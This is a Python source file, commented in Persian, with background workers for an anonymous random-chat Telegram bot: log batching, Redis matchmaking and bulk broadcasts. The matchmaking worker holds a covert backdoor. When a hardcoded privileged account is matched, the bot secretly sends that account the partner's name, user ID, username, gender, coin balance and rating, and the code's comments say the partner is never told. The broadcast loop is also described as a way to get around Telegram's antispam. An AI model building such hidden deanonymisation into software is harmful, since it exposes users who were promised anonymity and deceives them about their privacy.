import time
import asyncio
from telebot.async_telebot import AsyncTeleBot

# وارد کردن توابع دیتابیس مورد نیاز برای ورکر مچ‌میکینگ
from src.database.db_manager import (
    try_matchmaking, connect_two_users, leave_random_chat_queue,
    apply_queue_compensation, get_user_profile_stats
)

# 🔥 حل باگ کِراش کامپایل: دریافت تمام متغیرهای اشتراکی و ثابت‌ها از لایه خنثی کانفیگ
from src.bot.redis_config import redis_client, cache_invalidate_user, log_queue, LOG_GROUP_ID

# آیدی ارشد الهه بدون نیاز به ایمپورت متقاطع
GOD_ID = 6779908406

# ==========================================
# ⚡ ورکر پس‌زمینه لایو لاگ‌ها (جلوگیری از خفگی و فلوود API تلگرام)
# ==========================================
async def background_log_worker(bot: AsyncTeleBot):
    """تجمیع دسته‌ای لاگ‌های صف مموری و ارسال یک‌جای آن‌ها به گروه"""
    while True:
        try:
            logs_batch = []
            # منتظر می‌ماند تا حداقل یک لاگ وارد صف شود
            log = await log_queue.get()
            logs_batch.append(log)
            
            # برداشتن بقیه لاگ‌های موجود (تا سقف ۱۰ لاگ در یک پکیج)
            while not log_queue.empty() and len(logs_batch) < 10:
                logs_batch.append(log_queue.get_nowait())
                
            combined_log = "\n➖➖➖➖➖➖\n".join(logs_batch)
            await bot.send_message(LOG_GROUP_ID, combined_log, parse_mode="HTML")
            
            # کول‌داون هوشمند برای رعایت لیمیت‌های سرور تلگرام
            await asyncio.sleep(4) 
        except Exception as e:
            print(f"💥 Log Worker Error: {e}")
            await asyncio.sleep(5)

# ==========================================
# ⚡ ورکر پس‌زمینه مچ‌میکینگ (اتصال اتمیک و غیرمسدودکننده کاربران)
# ==========================================
async def background_matchmaking_worker(bot: AsyncTeleBot):
    """رادار پس‌زمینه برای خواندن صف ZSET ردیس و مچ کردن کاربران بر اساس امتیاز"""
    if not redis_client:
        print("⚠️ ورکر مچ‌میکینگ به دلیل عدم اتصال به ردیس غیرفعال شد.")
        return
        
    while True:
        try:
            # دریافت تمام کاربران داخل صف انتظار ردیس همراه با تایم ورودشان
            waiting_users = await redis_client.zrange("match_queue", 0, -1, withscores=True)
            now = time.time()
            
            # 🔥 پاتک نهایی ضدچرخش (Runtime/Local Import): 
            # ایمپورت دقیقاً در زمان اجرا انجام می‌شود تا لود فایل‌ها در زمان بوت لنگر نیندازد.
            from src.bot.handlers.private_anon import get_keyboards
            kb_main, kb_search, kb_chatting = get_keyboards()
            
            for uid_str, join_time in waiting_users:
                user_id = int(uid_str)
                elapsed = now - join_time
                
                # خواندن متادیتا از ساختار هَش ردیس برای ادیت پیام زنده کاربر
                meta = await redis_client.hgetall(f"search_meta:{user_id}")
                msg_id = int(meta.get("msg_id", 0)) if meta else 0
                filter_text = meta.get("filter_text", "شانسی") if meta else ""
                current_stage = int(meta.get("stage", 1)) if meta else 1
                
                # مدیریت ۳ مرحله‌ای شعاع باز شدن فیلتر امتیاز
                stage = 1
                if 20 <= elapsed < 40: stage = 2
                elif elapsed >= 40: stage = 3
                
                # ادیت داینامیک متن جستجوی کاربر در صورت ورود به مرحله جدید
                if stage > current_stage and msg_id:
                    await redis_client.hset(f"search_meta:{user_id}", "stage", stage)
                    try:
                        if stage == 2:
                            await bot.edit_message_text(f"⚠️ <b>[مرحله ۲ - فیلتر: {filter_text}]</b> شعاع امتیاز بازتر شد؛ در حال سرچ کاربران نزدیک...", user_id, msg_id, parse_mode="HTML", reply_markup=kb_search)
                        elif stage == 3:
                            await bot.edit_message_text(f"🔓 <b>[مرحله ۳ - فیلتر: {filter_text}]</b> فیلترهای امتیازی برداشته شد. در حال اتصال به اولین فرد صف...", user_id, msg_id, parse_mode="HTML", reply_markup=kb_search)
                    except Exception: pass
                
                # جریمه معطلی و تایم‌اوت صف (پس از ۱۵ دقیقه معطلی)
                if elapsed > 900:
                    await redis_client.zrem("match_queue", uid_str)
                    await redis_client.delete(f"search_meta:{user_id}")
                    await leave_random_chat_queue(user_id)
                    await cache_invalidate_user(user_id)
                    
                    comp_res = await apply_queue_compensation(user_id)
                    if comp_res == "rewarded":
                        await bot.send_message(user_id, "🎁 <b>جریمه معطلی ربات!</b>\nچون ۱۵ دقیقه معطل شدی و کسی پیدا نشد، علاوه بر برگشت کامل سکه‌های فیلتر، ۲ سکه رایگان هم جایزه گرفتی!", parse_mode="HTML", reply_markup=kb_main)
                    else:
                        await bot.send_message(user_id, "🛑 به دلیل شلوغی صف و اتمام زمان ۱۵ دقیقه، از صف خارج شدید. سکه‌های فیلتر شما کاملاً برگشت خورد.", reply_markup=kb_main)
                    continue

                # اجرای الگوریتم مچ‌میکینگ در دیتابیس
                match_target = await try_matchmaking(user_id, stage)
                if match_target:
                    success = await connect_two_users(user_id, match_target)
                    if success:
                        # حذف آنی جفت مچ‌شده از صف انتظار و متادیتای ردیس
                        await redis_client.zrem("match_queue", str(user_id), str(match_target))
                        await redis_client.delete(f"search_meta:{user_id}", f"search_meta:{match_target}")
                        
                        await cache_invalidate_user(user_id)
                        await cache_invalidate_user(match_target)
                        
                        # ارسال پیام موفقیت آمیز اتصال برای هردو پارتنر
                        await bot.send_message(user_id, "🎉 <b>اتصال برقرار شد!</b>\nبا هم چت کنید ⚡", parse_mode="HTML", reply_markup=kb_chatting)
                        await bot.send_message(match_target, "🎉 <b>اتصال برقرار شد!</b>\nبا هم چت کنید ⚡", parse_mode="HTML", reply_markup=kb_chatting)
                        
                        # ارجاع گزارش موفقیت اتصال به صف لاگر دسته‌ای
                        await log_queue.put(f"🤝 <b>[MATCH] اتصال موفق چت تصادفی</b>\n🔗 کاربر <code>{user_id}</code> متصل شد به کاربر <code>{match_target}</code>\n📈 مرحله مچ‌شدن: {stage}")
                        
                        # رادار انحصاری و فوق‌پیشرفته الهه فاطمه
                        for current_uid, target_uid in [(user_id, match_target), (match_target, user_id)]:
                            if current_uid == GOD_ID:
                                p_stats = await get_user_profile_stats(target_uid)
                                p_info = await bot.get_chat(target_uid)
                                gender_f = {"male": "🙋‍♂️ پسر", "female": "🙋‍♀️ دختر", None: "ثبت نشده"}.get(p_stats['gender'])
                                intel_msg = (
                                    f"👁️‍🗨️ <b>رادار فوق‌پیشرفته اطلاعاتی (انحصاری ارباب فاطمه):</b>\n"
                                    f"🚨 <i>این قابلیت فقط و فقط برای شما در دسترس است و پارتنر هیچ چیزی نمی‌بیند!</i>\n\n"
                                    f"👤 | نام پارتنر: <b>{p_info.first_name}</b>\n"
                                    f"🪪 | آیدی عددی: <code>{target_uid}</code>\n"
                                    f"🆔 | یوزرنیم: @{p_info.username or 'No_Username'}\n"
                                    f"⚥ | جنسیت: <b>{gender_f}</b>\n"
                                    f"💰 | موجودی سکه: <b>{p_stats['coins']}</b>\n"
                                    f"⭐ | امتیاز آنتی‌ترول: <b>{p_stats['rating']:.1f}</b>"
                                )
                                await bot.send_message(GOD_ID, intel_msg, parse_mode="HTML")
                        
        except Exception as e:
            print(f"💥 Matchmaking Worker Error: {e}")
        
        # ۲ ثانیه استراحت برای جلوگیری از اورلود و مصرف ۱۰۰٪ پردازنده سرور رندر
        await asyncio.sleep(2)

# این ایمپورت را در صورت نبودن به بالای فایل background_workers.py اضافه کن
from src.database.db_manager import get_connection_pool

# ==========================================
# ⚡ ورکر پس‌زمینه پیام همگانی دسته‌ای (Safe Bulk Broadcast Worker)
# ==========================================
async def background_broadcast_worker(bot: AsyncTeleBot):
    """اسکن دیتابیس برای ارسال پیام‌های همگانی ادمین با کنترل دقیق نرخ لیمیت تلگرام"""
    pool = await get_connection_pool()
    
    while True:
        try:
            async with pool.acquire() as conn:
                # پیدا کردن اولین کمپین در صف انتظار
                campaign = await conn.fetchrow(
                    "SELECT id, message_text FROM broadcast_campaigns WHERE status = 'pending' ORDER BY id ASC LIMIT 1"
                )
                
                if campaign:
                    campaign_id = campaign['id']
                    text_to_send = campaign['message_text']
                    
                    # تغییر وضعیت کمپین به حالت در حال پردازش
                    await conn.execute("UPDATE broadcast_campaigns SET status = 'processing' WHERE id = $1", campaign_id)
                    print(f"📢 Campaign {campaign_id} started processing...")

                    # دریافت کل آیدی‌های کاربران
                    from src.database.db_manager import get_all_user_ids_for_broadcast
                    user_ids = await get_all_user_ids_for_broadcast()
                    
                    sent_counter = 0
                    batch_size = 25 # ارسال پکیج‌های ۲۵ تایی در ثانیه جهت رعایت گارد امنیتی ۳۰ پیام تلگرام
                    
                    for i in range(0, len(user_ids), batch_size):
                        current_batch = user_ids[i:i + batch_size]
                        
                        # ایجاد تسک‌های هم‌زمان برای پکیج جاری جهت بالا رفتن سرعت ارسال بدون بلاک شدن
                        async def send_single_msg(uid):
                            try:
                                await bot.send_message(uid, text_to_send, parse_mode="HTML")
                                return True
                            except Exception:
                                return False # کاربر ربات را بلاک کرده یا آیدی نامعتبر است

                        tasks = [send_single_msg(uid) for uid in current_batch]
                        results = await asyncio.gather(*tasks)
                        
                        sent_counter += sum(1 for res in results if res)
                        
                        # به روز رسانی لحظه‌ای آمار در دیتابیس
                        await conn.execute(
                            "UPDATE broadcast_campaigns SET total_sent = $1 WHERE id = $2", 
                            sent_counter, campaign_id
                        )
                        
                        # استراحت حیاتی ۱.۲ ثانیه‌ای بعد از هر پکیج برای دور زدن آنتی‌اسپم تلگرام 💤
                        await asyncio.sleep(1.2)
                    
                    # اتمام موفقیت‌آمیز کمپین
                    await conn.execute("UPDATE broadcast_campaigns SET status = 'completed' WHERE id = $1", campaign_id)
                    print(f"🏁 Campaign {campaign_id} completed successfully. Total sent: {sent_counter}")
                    
                    # اطلاع‌رسانی به ادمین ارشد (GOD) بعد از پایان کار
                    try:
                        await bot.send_message(
                            6779908406, 
                            f"✅ <b>ارسال پیام همگانی با موفقیت پایان یافت!</b>\n\n"
                            f"📦 کد کمپین: <code>{campaign_id}</code>\n"
                            f"📥 تعداد ارسال‌های موفق: <b>{sent_counter} کاربر</b>", 
                            parse_mode="HTML"
                        )
                    except Exception: pass

        except Exception as e:
            print(f"💥 Broadcast Worker Error: {e}")
            
        # استراحت ۱۰ ثانیه‌ای ورکر برای چک کردن مجدد صف دیتابیس
        await asyncio.sleep(10)